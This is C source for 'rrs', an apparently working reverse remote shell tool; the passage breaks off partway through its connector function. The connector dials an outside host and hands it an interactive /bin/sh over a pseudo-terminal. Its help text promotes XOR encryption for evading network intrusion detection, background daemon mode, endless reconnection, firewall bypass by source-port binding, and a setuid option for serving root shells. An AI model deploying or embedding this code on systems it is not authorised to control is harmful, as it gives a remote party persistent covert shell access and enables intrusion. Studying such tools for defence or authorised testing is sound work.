/* rrs - Reverse Remote Shell - $Revision: 1.70 $
 * Copyright (C) 2004 Michel Blomgren <michel@cycom.se>
 * http://www.cycom.se/dl/rrs
 *
 * Permission is hereby granted, free of charge, to any person obtaining a
 * copy of this software and associated documentation files (the "Software"),
 * to deal in the Software without restriction, including without limitation
 * the rights to use, copy, modify, merge, publish, distribute, sublicense,
 * and/or sell copies of the Software, and to permit persons to whom the
 * Software is furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
 * FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER
 * DEALINGS IN THE SOFTWARE.
 *
 * Twofish implementation Copyright (c) 1995-2001 The Cryptix Foundation
 * Limited. Twofish API (farm9crypt) by jojo@farm9.com. Twofish encryption was
 * derived from cryptcat (by farm9, [et al?]).
 *
 *
 * Compile like this:
 *
 *  $ gcc -s -O2 -lutil -lssl -o rrs rrs.c
 *
 * Or, your system might need libcrypto:
 *
 *  $ gcc -s -O2 -lutil -lssl -lcrypto -o rrs rrs.c
 *
 * Or, if your system doesn't have GNU's getopt_long():
 *
 *  $ gcc -DWITHOUT_GNU_GETOPT -s -O2 -lutil -lssl -lcrypto -o rrs rrs.c
 *
 * You may also need to add -I/usr/local/include and/or -L/usr/local/lib on
 * some systems.
 *
 * If you don't want OpenSSL support:
 *
 *  $ gcc -DWITHOUT_SSL -s -O2 -lutil -o rrs rrs.c
 *
 * Generate a private and public (certificate) key PEM file like this:
 *
 *  $ openssl req -new -x509 -nodes -out test.pem -keyout test.pem -days 3650
 *
 * Send bug reports to <michel@cycom.se>. Please describe exactly
 * what the problem is -- in detail -- and include the revision number and/or
 * the rcsid[] string below.
 */

static unsigned char rcsid[] =
"$Id: rrs.c,v 1.70 2004/05/30 00:32:03 shadow Exp $\n";

#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>

#if defined(__linux__)
    #include <sys/select.h>
#elif defined(__FreeBSD__) || defined(__NetBSD__) || defined(__OpenBSD__) || defined(__QNX__)
    #include <sys/time.h>
#elif defined(solaris) || (defined(__SVR4) && defined(sun))
    #warning Solaris is not supported at the moment, please e-mail michel@cycom.se if you have a solution how to successfully compile rrs under Solaris.
#else
    #warning unknown operating system, you may need to tweak the #include lines
#endif

#include <sys/ioctl.h>
#include <string.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#if defined(__linux__)
    #include <pty.h>
#elif defined(__FreeBSD__)
    #include <libutil.h>
#elif defined(__NetBSD__) || defined(__OpenBSD__)
    #include <util.h>
#elif defined(__QNX__)
    #include <unix.h>
#elif defined(solaris) || (defined(__SVR4) && defined(sun))
    #warning Solaris is not supported at the moment, please e-mail michel@cycom.se if you have a solution how to successfully compile rrs under Solaris.
#else
    #warning unknown operating system, you may need to tweak the #include lines
#endif

#include <netdb.h>
#include <signal.h>
#include <termios.h>

#if ! defined(__QNX__)
    #include <getopt.h>
#endif

#include <errno.h>

#if ! defined(WITHOUT_SSL)
    #include <openssl/crypto.h>
    #include <openssl/x509.h>
    #include <openssl/pem.h>
    #include <openssl/evp.h>
    #include <openssl/ssl.h>
    #include <openssl/err.h>
#endif

#include "farm9crypt.h"

#if ! defined(WITHOUT_SSL)
    #if OPENSSL_VERSION_NUMBER < 0x00907000L
        #warning You need OpenSSL >= 0.9.7 in order to verify certificates against CRL files!
    #endif
#endif

static unsigned char banner[] =
"rrs %s - Reverse Remote Shell\n"
"Copyright (C) 2004 Michel Blomgren <michel@cycom.se>\n";

static unsigned char helptext[] =
"rrs is distributed under the MIT License, type \"rrs -L\" for details.\n"
"\n"
"connect: rrs [options] hostname port\n"
" listen: rrs [options] -l [-p port]\n"
"\n"
"options:\n"
"   -h, --help          This help.\n"
"   -l, --listen        Listen for incoming rrs connection, default port is\n"
"                       31337, change with -p.\n"
"   -p, --port n        For -l (listen), bind to port n instead of 31337.\n"
"   -b, --source-port n For the connector, bind to source port n instead of\n"
"                       letting the kernel choose a source port. Good if you\n"
"                       bump into some strange fw config that only allows\n"
"                       specific tcp source/dest port pairs through (then use\n"
"                       -b and laugh at their lousy sec).\n"
"   -r, --reconnect n   Reconnect until we've got a connection, pause for n\n"
"                       seconds between connection attempts. --timeout is\n"
"                       relevant here, since it'll control how long connect()\n"
"                       may take until timing out. The kernel max connect()\n"
"                       timeout can never be increased though.\n"
"   -R, --infinite-reconnect n\n"
"                       Same as --reconnect, except it won't exit after a\n"
"                       successful connection has been terminated. It will\n"
"                       loop continuously, until killed.\n"
"   -t, --timeout n     Timeout in seconds, for both -l and connect().\n"
"   -D, --daemon        Tell the connector to fork into a background process\n"
"                       before attempting to connect. --daemon automatically\n"
"                       enables --quiet.\n"
"   -k, --twofishkey phrase\n"
"                       Tell rrs to use the built-in Twofish encryption for\n"
"                       communication. This implementation isn't all that\n"
"                       efficient, something you will experience when typing,\n"
"                       but not when receiving/sending a steady stream. phrase\n"
"                       is either a password or phrase that you specify on the\n"
"                       command line, or if you specify \"-k-\" rrs will read\n"
"                       one from stdin. IMPORTANT! With a symmetric cipher\n"
"                       both the listener and the connector has to use the\n"
"                       same pass phrase in order to communicate. If you use\n"
"                       the -k option, you can not use -s (OpenSSL) or -x\n"
"                       (xorcrypt).\n"
"   -x, --xorkey phrase\n"
"                       Tell rrs to use the built-in per-byte XOR (very simple\n"
"                       symmetric) encryption for communication. This cipher\n"
"                       is quite weak and should not be considered decent\n"
"                       encryption. It's useful for effectively evading a NIDS\n"
"                       and general interception. As with -k above, phrase is\n"
"                       either a password that you specify on the command line\n"
"                       or from stdin using \"-x-\". Since this XOR cipher\n"
"                       loops the key for the data received/transmitted, the\n"
"                       engine will be initialized with a 144 byte ascii hash\n"
"                       (SHA1+MD5+SHA1+MD5). The hash is generated by\n"
"                       calculating a SHA1+MD5 hash of the phrase, then the\n"
"                       phrase is reversed and hashed again (SHA1+MD5) to form\n"
"                       the entire key.\n"
#if ! defined(WITHOUT_SSL)
"   -s, --ssl           OpenSSL encrypted communication instead of plain text.\n"
"                       rrs will use the TLSv1 protocol method by default, you\n"
"                       can change it with, e.g., --ssl=tlsv1 for instance, or\n"
"                       the -S option.\n"
"   -S, --ssl=method    Choose OpenSSL protocol (case doesn't matter):\n"
"                           -S SSLv2\n"
"                           -S SSLv3\n"
"                           -S TLSv1\n"
"                       If you use --ssl instead of -S, please remember to use\n"
"                       the equal sign, e.g., --ssl=sslv3.\n"
"   -P, --pem file      Specify private key and certificate (public key) file.\n"
"                       The file should begin with a PEM encoded private key\n"
"                       followed by a PEM encoded certificate. Both the\n"
"                       listener and the connector must provide a private key\n"
"                       and certificate since authentication of the listener\n"
"                       is the default behavior. If you specify -v0 on both\n"
"                       sides, only the listener (-l) needs a PEM file, not\n"
"                       the connector. The PEM file can contain several\n"
"                       certificates after each other that you trust. Whoever\n"
"                       has got the private key to those certificates will be\n"
"                       allowed to receive the connection by the connector (in\n"
"                       default -v1 mode). As a security precaution, the\n"
"                       receiver (listener) verifies the connector's\n"
"                       certificate by default, thus, both the listener and\n"
"                       the connector must exchange their public keys\n"
"                       (certificates), or trust a common CA (self-signed\n"
"                       certificate) who's signed each party's certificate.\n"
"   -C, --ca file       Optional. If you want to specify additional\n"
"                       certificates you trust, just append them to file, one\n"
"                       certificate after the other. By default, the\n"
"                       certificate(s) in the -P (--pem) file is/are trusted.\n"
"                       You may also use the -C option to add CRL (Certificate\n"
"                       Revocation List) files (only supported in OpenSSL\n"
"                       0.9.7 or later). The -C (--ca or --crl) can be\n"
"                       specified several times on the command line to include\n"
"                       an arbitrary amount of certificate files and/or CRL\n"
"                       files, e.g.: -C ca.crt -C subca.crt -C subca.crl\n"
"                       If no CRL file is added, no CRL checking is done.\n"
"   --crl file          Same as above. Option added for logical reasons.\n"
"   -c, --cipher cipher Define permitted SSL ciphers in a colon delimited\n"
"                       list, for example:\n"
"                           --cipher AES256-SHA:AES128-SHA\n"
"                           --cipher HIGH\n"
"                           --cipher HIGH:MEDIUM\n"
"                           --cipher \"DES-CBC3-SHA\"\n"
"                       DO NOT USE EXPORT OR NULL CIPHERS SUCH AS\n"
"                       \"EXPORT40\", \"NULL\", \"aNULL\" or \"EXPORT\".\n"
"                       Type \"openssl ciphers\" or \"openssl ciphers HIGH\"\n"
"                       for a list of your OpenSSL suite's ciphers.\n"
"   -v, --verify n      Verify peer SSL certificate (authentication), this is\n"
"                       on by default. Replace n with:\n"
"                           0 = no verification/authentication\n"
"                           1 = verify both listener and connector (default)\n"
"                       Both the connector (the shell provider) and the\n"
"                       listener trust the certificate(s) in the --pem file and\n"
"                       in the --ca file (if --ca file was provided).\n"
#endif
"   -e, --exec command  Have the listener execute command on remote host.\n"
"                       Please note that after the command line has been\n"
"                       execute, it won't exit the shell (like ssh, e.g.).\n"
"                       You'll manually have to add \" ; exit\" to your\n"
"                       command to log out.\n"
"   -m, --monitor       Connector only. When serving a shell, echo/monitor\n"
"                       everything that the listener is doing. You can record\n"
"                       the session with a program called ttyrec found at\n"
"                       http://namazu.org/~satoru/ttyrec/.\n"
"   -0, --setuid        With this option, rrs will try to setuid(geteuid()) if\n"
"                       current UID and the effective UID isn't the same (if\n"
"                       rrs is chmodded 4755 and chowned root, e.g.). The\n"
"                       primary purpose of this option is to offer a root\n"
"                       shell from a regular account or if you want to receive\n"
"                       connections to privileged ports (<1024). You *must*\n"
"                       chmod rrs 4755 or 6755 and chown it to root if you\n"
"                       plan to offer root shells. The security issues\n"
"                       involved with chmodding rrs 4755 are quite obvious! ;)\n"
"   -q, --quiet         Be quiet, don't print anything.\n"
"   -L, --license       Print the MIT License and exit.\n"
"   -V, --version       Print program banner, copyright and RCS id then exit.\n"
#if ! defined(WITHOUT_SSL)
"Generate an OpenSSL private/public key file like this, e.g.:\n"
"$ openssl req -new -x509 -nodes -out rrs.crt -keyout rrs.pem -days 3650\n"
"$ cat rrs.crt >> rrs.pem\n"
"$ cat rrs.crt | mail -s \"My certificate\" other@side.tld\n"
"\"-nodes\" means not to encrypt the private key, you can remove it, either\n"
"way, make sure you keep the private key *private*! Another example:\n"
"$ openssl genrsa -aes256 -out rrs.pem 2048\n"
"$ openssl req -x509 -new -key rrs.pem -out rrs.crt -days 3650\n"
"$ cat rrs.crt >> rrs.pem\n"
"The two examples above are PKC (public-key cryptography). For PKI (public-key\n"
"infrastructure) please read the README file and/or use the accompanied scripts\n"
"under the openssl_scripts directory.\n"
"\n"
    #if OPENSSL_VERSION_NUMBER < 0x00907000L
    "WARNING: rrs was compiled without CRL verification support, you can not use\n"
    "CRL files for banning revoked certificates!\n"
    "\n"
    #endif
#else
"WARNING: rrs was compiled without OpenSSL support (-DWITHOUT_SSL). You can\n"
"still use Twofish (the -k option) or the simple XOR cipher for encrypted\n"
"communication, but you can not use OpenSSL's authentication features.\n"
"\n"
#endif

#if defined(WITHOUT_GNU_GETOPT)
"WARNING: rrs was compiled without GNU getopt_long() support. None of the long\n"
"options listed above are available, use (regular) short options only.\n"
"\n"
#endif

"SECURITY WARNING: Avoid using plain-text communication as it can be\n"
"intercepted, recorded and even modified. NIDS like Snort may (if correctly\n"
"configured) trigger alerts when, e.g. you type \"id\". Beware!\n"
"\n"
"Send bug reports to <michel@cycom.se>. Make sure you include the\n"
"output of \"rrs -V\" and describe how to reproduce the bug.\n";



extern int h_errno;
extern int errno;
extern char *optarg;
extern int optind, opterr, optopt;

/******************************************************************************
* global variables and defaults
******************************************************************************/


/* default port */
#define DEFPORT 31337

#define err_generic     1
#define err_connect     2
#define err_timeout     3

/* ASCII control characters, 0xff starts IAC (interpret as command).
 * The use of control characters was inspired by telnet and ssh. rrs does
 * however use it's own very simple control character sequences between the
 * listener and the connector.
 */

#define cc_control_character    0xff
#define cc_command_wsize        0x01

/**** for future versions
#define cc_command_reset        0x02
#define cc_command_reconnect    0x03
#define cc_command_sigkill      0x04
****/


/****** various other global variables ******/

#if ! defined(WITHOUT_SSL)
    enum { none, TLSv1, SSLv3, SSLv2 } rrs_ssl = none;
    char *sslprotocols[] = { "none", "TLSv1", "SSLv3", "SSLv2" };
#endif

unsigned int sourceport = 0,
             cport = DEFPORT,
             lport = DEFPORT,
             rrs_listen = 0,
             rrs_daemon = 0,
#if ! defined(WITHOUT_SSL)
             rrs_sslverify = 1,
#endif
             silent = 0,
             timeout = 0,
             reconnect = 0,
             infinite_reconnect = 0,
             monitor = 0,
             set_effective_uid = 0;

unsigned char *keyfile = NULL;
unsigned char *cipher = NULL;
unsigned char *cafile = NULL;
unsigned char *crlfile = NULL;

unsigned char *remote_command = NULL;

unsigned char *twofishkey = NULL;
unsigned char *xorkey = NULL;

struct termios oldttyattr, newttyattr;
struct winsize wsize = { 0, 0, 0, 0 };
int usingtty;

char gbuf[1500];    /* global temporary buffer */

int On = 1;
int Off = 0;

#if OPENSSL_VERSION_NUMBER >= 0x00907000L
    int we_got_a_crl = 0;
#endif

/****** global variables for the connecting_pty_shell() function ******/
int child_is_dead;
int alarm_triggered;

/****** global variables for the listener() function ******/
int listener_clisd;
int got_winch;



/****** global variables for ssl ******/

#if ! defined(WITHOUT_SSL)
    SSL_METHOD *sslmethod;
    SSL_CTX *sslctx;
    SSL *ssl;
    X509 *peer_cert;
    #if OPENSSL_VERSION_NUMBER >= 0x00907000L
        X509_STORE *sslstore;
    #endif
#endif

/******************************************************************************
* functions
******************************************************************************/

/* include the simple xor "crypt" */
#include "xorcrypt.h"


#if OPENSSL_VERSION_NUMBER >= 0x00907000L
    int find_x509_crl(char *line, FILE *strm) {
        char crl_line[] = "-----BEGIN X509 CRL-----";
        if (!strncmp(line, crl_line, strlen(crl_line))) {
            we_got_a_crl = 1;
            return 1;
        }
        return 0;
    }

    #ifndef foreachline_max_linebuf_bytes
        #define foreachline_max_linebuf_bytes 1024*4
    #endif
    void foreachline(FILE *strm, int(*function)(char *line, FILE *strm)) {
    /*
     *	Executes a user-specified function for each line in a stream.
     *	If the "function" returns (int) 0 it will continue to call it.
     *	If the "function" return != 0, then it will stop.
     *
     *	foreachline() handles UNIX, DOS and/or Macintosh text files.
     *
     *	e.g.:
     *		int myfunction(char *line, FILE *strm) {
     *			printf("%s\n", line);	// echo the line to stdout.
     *			return 0;
     *		}
     *
     *		...
     *
     *		foreachline(stdin, myfunction);
     *
     */
        char charbuf[1];
        char linebuf[foreachline_max_linebuf_bytes];
        unsigned int lastchar = 0;
        int i = 0;
        int truncate = 0;

        linebuf[0] = 0;

        while (1) {
	    fread(charbuf, 1, 1, strm);

	    if (feof(strm)) {
	        if (strlen(linebuf)) {
		    function(linebuf, strm);
	        }
	        break;
	    }

	    if (ferror(strm)) {
	        break;
	    }

	    if (charbuf[0] == 0x0a || charbuf[0] == 0x0d) {
	        if ((charbuf[0] == 0x0a && lastchar == 0x0d) || (charbuf[0] == 0x0d && lastchar == 0x0a)) {
		    /* nop */
	        } else {
		    if (!truncate) {
		        if (function(linebuf, strm))
			    break;
		        linebuf[0] = 0;
		    }
	        }

	        truncate = 0;
	        i = 0;
	    } else {
	        if (!truncate) {
		    linebuf[i] = charbuf[0];
		    linebuf[i+1] = 0;
		    i++;
		    if (i >= (sizeof(linebuf)-1)) {
		        if (function(linebuf, strm))
			        break;
		        linebuf[0] = 0;
		        truncate = 1;
		    }
	        }
	    }

	    lastchar = charbuf[0];
        }
    }
#endif



void removechar(char *string, unsigned int c) {
/*
 * strips a null-terminated string from char c.
 *
 * example usage:
 *
 *	char string[] = "TEST\nSTRÄNG";
 *
 *	removechar(string, 0x0a);
 *
 */
    char *dest = string;
    unsigned int x = 0;
    unsigned int i;

    for (i = 0; string[i] != 0; i++) {
	if (string[i] != c) {
	    dest[x] = string[i]; x++;
	}
    }
    dest[x] = '\0';
}


unsigned char *get_revision(unsigned char *string) {
/*
 * input string is an RCS Id keyword
 */
    char Id_string[] = "$Id: ";
    char *idstart;
    static unsigned char revision[16];
    int i, x, column_counter;

    if (!(idstart = strstr(string, Id_string))) {
        return NULL;
    }

    idstart += strlen(Id_string);

    column_counter = 1;
    x = 0;
    for (i = 0; x < (sizeof(revision)-1); i++) {
        if (idstart[i] == 0)
            return NULL;

        if (column_counter < 2) {
            if (idstart[i] == 0x20)
                column_counter++;
        } else {      /* column 2 is the rcs revision number */
            if (((idstart[i] < '0') || (idstart[i] > '9')) && (idstart[i] != '.'))
                break;
            revision[x] = idstart[i];
            x++;
        }
    }

    revision[x] = 0;
    return revision;
}


unsigned char *convert2dotted_hex(unsigned char *string, int i) {
    int x = 0, z = 0;
    unsigned char y;
    static unsigned char buf[1024];

    buf[0] = 0;

    if (!string)
        return NULL;

    while (i) {
        if (x >= (sizeof(buf)-1))
            break;
        y = ((string[z] & 0xf0) >> 4);
        if (y < 10) y += 0x30;
        else y += 0x61 - 10;
        buf[x] = y;
        x++;

        if (x >= (sizeof(buf)-1))
            break;
        y = (string[z] & 0x0f);
        if (y < 10) y += 0x30;
        else y += 0x61 - 10;
        buf[x] = y;
        x++;

        z++;

        i--;
        if (i) {
            if (x >= (sizeof(buf)-1))
                break;
            buf[x] = ':';
            x++;
        }
    }

    buf[x] = 0;
    return buf;
}

void connecting_pty_shell_signalhandler(int signum) {
    switch (signum) {
        case SIGCHLD:
            waitpid(-1, NULL, WNOHANG);
            child_is_dead = 1;
            break;
        case SIGHUP:
        case SIGPIPE:
            /* ignore SIGHUP and SIGPIPE */
            break;
        case SIGINT:
        case SIGQUIT:
        case SIGTERM:
        case SIGABRT:
            if (!silent) {
                fprintf(stderr, "[i] connector forcefully terminated!\n");
            }
            exit(0);
        default:
            break;
    }
    signal(signum, connecting_pty_shell_signalhandler);
}

int connecting_pty_shell(char *hostname, unsigned int port) {
    static int sopt = 0;
    int sd, master_fd, slave_fd;
    pid_t pid;

    unsigned char buf[1500];     /* why not have the buffer size like the most common MTU? */

    struct sockaddr_in servAddr;
    struct sockaddr_in connectAddr;
    struct hostent *he;
    char *ascii_ip;

    struct timeval tv;


    if (!hostname) {
        return err_generic;
    }
    if ((port < 1) || (port > 65535)) {
        if (!silent) {
            fprintf(stderr, "[?] port is not in the range 1-65535!\n");
        }
        return err_generic;
    }

    /*
     * install signalhandler
     */

    signal(SIGPIPE, connecting_pty_shell_signalhandler);
    signal(SIGHUP, connecting_pty_shell_signalhandler);
    signal(SIGINT, connecting_pty_shell_signalhandler);
    signal(SIGQUIT, connecting_pty_shell_signalhandler);
    signal(SIGTERM, connecting_pty_shell_signalhandler);
    signal(SIGABRT, connecting_pty_shell_signalhandler);

    /*
     * resolve and connect()
     */

    if (!(he = gethostbyname(hostname))) {
        if (!silent) {
            herror(hostname);
        }
        return err_generic;
    }

    ascii_ip = inet_ntoa(*((struct in_addr*)he->h_addr_list[0]));
    if (!ascii_ip)
        return err_generic;

    servAddr.sin_family = he->h_addrtype;
    memcpy(&servAddr.sin_addr.s_addr, he->h_addr_list[0], he->h_length);
    servAddr.sin_port = htons((short)port);

    /* create socket */
    if ((sd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        if (!silent) {
            fprintf(stderr, "[?] socket(): %s\n", strerror(errno));
        }
        return err_generic;
    }

    /* if source port > 0, then we use bind() to choose a user-specified source port */
    if (sourceport) {
        if ((sourceport < 1) || (sourceport > 65535)) {
            if (!silent) {
                fprintf(stderr, "[?] source port is not in the range 1-65535!\n");
            }
            return err_generic;
        }

        sopt = 1;
        connectAddr.sin_family = AF_INET;
        connectAddr.sin_addr.s_addr = htonl(INADDR_ANY);
        connectAddr.sin_port = htons(sourceport);

        /* set REUSEADDR socket option */
        if (setsockopt(sd, SOL_SOCKET, SO_REUSEADDR, &sopt, sizeof(sopt)) < 0) {
            if (!silent) {
                fprintf(stderr, "[?] setsockopt(): %s\n", strerror(errno));
            }
            return err_generic;
        }

        /* bind to custom source port */
        if (bind(sd, (struct sockaddr*)&connectAddr, sizeof(connectAddr))) {
            if (!silent) {
                fprintf(stderr, "[?] bind() to port %i: %s\n", sourceport, strerror(errno));
            }
            return err_generic;
        }
    }

    if (!silent) {
        printf("[+] connecting to %s:%u (%s), ", hostname, port, ascii_ip);
        if (timeout) {
            printf("timeout is %u seconds\n", timeout);
        } else {
            printf("using kernel connect() timeout\n");
        }
    }

    /* if connect() timeout (-t) is specified, poll sd */
    if (timeout) {
        /* set socket in non-blocking mode */
        ioctl(sd, FIONBIO, &On);

        if (connect(sd, (struct sockaddr *)&servAddr, sizeof(servAddr)) < 0) {
            if (errno != EINPROGRESS) {
                if (!silent) {
                    fprintf(stderr, "[?] can't connect to %s:%u (%s): %s\n",
                        hostname, port, ascii_ip, strerror(errno));
                }
                close(sd);
                return err_connect;
            }
        }

        while (1) {
            fd_set fds;
            int err;
            struct sockaddr fUbar;
            socklen_t sNafu;
 
            FD_ZERO(&fds);
            FD_SET(sd, &fds);

            tv.tv_sec = (long)timeout;
            tv.tv_usec = 0;

            err = select(FD_SETSIZE, NULL, &fds, NULL, &tv);
            if (err > 0) {
                if (FD_ISSET(sd, &fds)) {
                    /*
                     * we use getpeername() to find out whether the socket is
                     * connected or not (if it failed to connect or not).
                     */
                    sNafu = sizeof(struct sockaddr);
                    if (getpeername(sd, &fUbar, &sNafu) < 0) {
                        if (!silent) {
                            fprintf(stderr, "[?] can't connect to %s:%u (%s): %s\n",
                                hostname, port, ascii_ip, strerror(errno));
                        }
                        close(sd);
                        return err_connect;
                    }
                    break;
                }
            } else {
                if (!silent) {
                    fprintf(stderr, "[?] connect to %s:%u (%s) timed out!\n",
                        hostname, port, ascii_ip);
                }
                close(sd);
                return err_timeout;
            }
        }

        /* set socket in blocking mode again */
        ioctl(sd, FIONBIO, &Off);

    } else {
        /* no timeout for connect() */
        if (connect(sd, (struct sockaddr *)&servAddr, sizeof(servAddr)) < 0) {
            if (!silent) {
                fprintf(stderr, "[?] can't connect to %s:%u (%s): %s\n",
                    hostname, port, ascii_ip, strerror(errno));
            }
            close(sd);
            return err_connect;
        }
    }


#if ! defined(WITHOUT_SSL)
    /**** start SSL negotiation ****/
    if (rrs_ssl) {
        if (!(ssl = SSL_new(sslctx))) {
            if (!silent) {
                fprintf(stderr, "[?] SSL_new(): %s\n", ERR_reason_error_string(ERR_get_error()));
            }
            close(sd);
            return err_generic;
        }
        if (!SSL_set_fd(ssl, sd)) {
            if (!silent) {
                fprintf(stderr, "[?] SSL_set_fd(): %s\n", ERR_reason_error_string(ERR_get_error()));
            }
            close(sd);
            SSL_free(ssl);
            return err_generic;
        }

        if (SSL_connect(ssl) <= 0) {
            if (!silent) {
                fprintf(stderr, "[?] SSL_connect(): %s\n", ERR_reason_error_string(ERR_get_error()));
            }
            close(sd);
            SSL_free(ssl);
            return err_generic;
        }

        if (!silent) {
            printf("[i] ssl connection using cipher %s\n", SSL_get_cipher(ssl));
        }

        /**** get peer (listening side) certificate ****/

        if (!(peer_cert = SSL_get_peer_certificate(ssl))) {
            if (!silent) {
                fprintf(stderr, "[?] %s:%u (%s) did not present a certificate!\n",
                    hostname, port, ascii_ip);
            }
            SSL_shutdown(ssl);
            close(sd);
            SSL_free(ssl);
            return err_generic;
        }

        /**** print certificate information ****/

        if (!silent) {
            unsigned int mdsha_size;
            unsigned char mdsha[EVP_MAX_MD_SIZE];

            printf("[i] receiver (listener) certificate information:\n");
            printf("... subject: %s\n", X509_NAME_oneline(X509_get_subject_name(peer_cert), 0, 0));
            printf("... issuer: %s\n", X509_NAME_oneline(X509_get_issuer_name(peer_cert), 0, 0));

            if (!X509_digest(peer_cert, EVP_md5(), mdsha, &mdsha_size)) {
                if (!silent) {
                    fprintf(stderr, "[?] X509_digest\n");
                }
                X509_free(peer_cert);
                SSL_shutdown(ssl);
                close(sd);
                SSL_free(ssl);
                return err_generic;
            }
            printf("... md5 fingerprint: %s\n", convert2dotted_hex(mdsha, mdsha_size));

            if (!X509_digest(peer_cert, EVP_sha1(), mdsha, &mdsha_size)) {
                if (!silent) {
                    fprintf(stderr, "[?] err\n");
                }
                X509_free(peer_cert);
                SSL_shutdown(ssl);
                close(sd);
                SSL_free(ssl);
                return err_generic;
            }
            printf("... sha1 fingerprint: %s\n", convert2dotted_hex(mdsha, mdsha_size));
        }
        X509_free(peer_cert);
    }
    /**** end of SSL negotiation ****/
#endif

    if (!silent) {
        printf("[+] serving shell to %s:%u (%s)\n",
            hostname, port, ascii_ip);
    }

    /* open a tty */
    if (openpty(&master_fd, &slave_fd, NULL, NULL, NULL) < 0) {
        if (!silent) {
            fprintf(stderr, "[?] openpty(): %s\n", strerror(errno));
        }
#if ! defined(WITHOUT_SSL)
        if (rrs_ssl) {
            SSL_shutdown(ssl);
        }
#endif
        close(sd);
#if ! defined(WITHOUT_SSL)
        if (rrs_ssl) {
            SSL_free(ssl);
        }
#endif
        return err_generic;
    }

    /* fork */
    pid = fork();
    if (pid == 0) {
        /* child process */
        close(sd);
        close(master_fd);
        setsid();
        ioctl(slave_fd, TIOCSCTTY);
        dup2(slave_fd, 0);
        dup2(slave_fd, 1);
        dup2(slave_fd, 2);
        close(slave_fd);
        signal(SIGHUP, SIG_DFL);
        signal(SIGCHLD, SIG_DFL);
        execl("/bin/sh", "", NULL);
        /* should not return */
        exit(1);
    } else if (pid > 0) {
        /* parent process */

        close(slave_fd);    /* the parent doesn't need the slave fd */

        child_is_dead = 0;
        signal(SIGCHLD, connecting_pty_shell_signalhandler);

        while(1) {
            fd_set fds;
            char *memp;
            int cnt, rlen, origrlen, copied;
            unsigned char ccbuf[8];

            FD_ZERO(&fds);
            FD_SET(master_fd, &fds);
            FD_SET(sd, &fds);

            if (child_is_dead)
                break;

            if (select(FD_SETSIZE, &fds, NULL, NULL, NULL)) {
                if (child_is_dead)
                    break;
                if (FD_ISSET(master_fd, &fds)) {
                    if ((cnt = read(master_fd, buf, sizeof(buf))) < 1) {
                        if (errno == EWOULDBLOCK || errno == EAGAIN)
                            continue;
                        else
                            break;
                    }

#if ! defined(WITHOUT_SSL)
                    if (rrs_ssl) {
                        SSL_write(ssl, buf, cnt);
                    } else {
#endif
                        if (twofishkey) {
                            farm9crypt_write(sd, buf, cnt);
                        } else if (xorkey) {
                            xorcrypt_write(sd, buf, cnt);
                        } else {
                            write(sd, buf, cnt);
                        }
#if ! defined(WITHOUT_SSL)
                    }
#endif

                    /* write to stdout also if we're monitoring this session */
                    if (monitor && (!silent)) {
                        write(STDOUT_FILENO, buf, cnt);
                    }
                }
                if (FD_ISSET(sd, &fds)) {
#if ! defined(WITHOUT_SSL)
                    if (rrs_ssl) {
                        if ((cnt = SSL_read(ssl, buf, sizeof(buf))) <= 0) {
                            int err;
                            err = SSL_get_error(ssl, cnt);
                            if (err == SSL_ERROR_WANT_READ)
                                continue;
                            else
                                break;
                        }
                    } else {
#endif
                        if (twofishkey) {
                            if ((cnt = farm9crypt_read(sd, buf, sizeof(buf))) < 1) {
                                if (errno == EWOULDBLOCK || errno == EAGAIN)
                                    continue;
                                else
                                    break;
                            }
                        } else if (xorkey) {
                            if ((cnt = xorcrypt_read(sd, buf, sizeof(buf))) < 1) {
                                if (errno == EWOULDBLOCK || errno == EAGAIN)
                                    continue;
                                else
                                    break;
                            }
                        } else {
                            if ((cnt = read(sd, buf, sizeof(buf))) < 1) {
                                if (errno == EWOULDBLOCK || errno == EAGAIN)
                                    continue;
                                else
                                    break;
                            }
                        }
#if ! defined(WITHOUT_SSL)
                    }
#endif

                    /*
                     * The if-statement below was originally derived from
                     * "bindtty" by "sd". It turned out to become heavily
                     * modified and bug-fixed after a few hours of hacking.
                     */
                    if ((memp = memchr(buf, cc_control_character, cnt))) {
                        origrlen = rlen = cnt - ((unsigned long)memp - (unsigned long)buf);
                        copied = 0;

                        if (rlen > 2) {
                            rlen = 2;
                        }
                        if (rlen > 0) {
                            memcpy(ccbuf, memp, rlen);
                            copied += rlen;
                        }
                        if (rlen < 2) {
                            ioctl(sd, FIONBIO, &Off);   /* turn off non-blocking IO */
#if ! defined(WITHOUT_SSL)
                            if (rrs_ssl) {
                                SSL_read(ssl, &ccbuf[rlen], 2 - rlen);
                            } else {
#endif
                                if (twofishkey) {
                                    farm9crypt_read(sd, &ccbuf[rlen], 2 - rlen);
                                } else if (xorkey) {
                                    xorcrypt_read(sd, &ccbuf[rlen], 2 - rlen);
                                } else {
                                    read(sd, &ccbuf[rlen], 2 - rlen);
                                }
#if ! defined(WITHOUT_SSL)
                            }
#endif
                            ioctl(sd, FIONBIO, &On);    /* turn non-blocking IO back on */
                        }

                        rlen = origrlen - rlen;

                        switch ((unsigned char)ccbuf[1]) {
                            case cc_command_wsize:
                                if (rlen > 2) {
                                    rlen = 2;
                                }
                                if (rlen > 0) {
                                    memcpy(&ccbuf[2], &memp[2], rlen);
                                    copied += rlen;
                                }
                                if (rlen < 2) {
                                    ioctl(sd, FIONBIO, &Off);   /* turn off non-blocking IO */
#if ! defined(WITHOUT_SSL)
                                    if (rrs_ssl) {
                                        SSL_read(ssl, &ccbuf[(2+rlen)], 2 - rlen);
                                    } else {
#endif
                                        if (twofishkey) {
                                            farm9crypt_read(sd, &ccbuf[(2+rlen)], 2 - rlen);
                                        } else if (xorkey) {
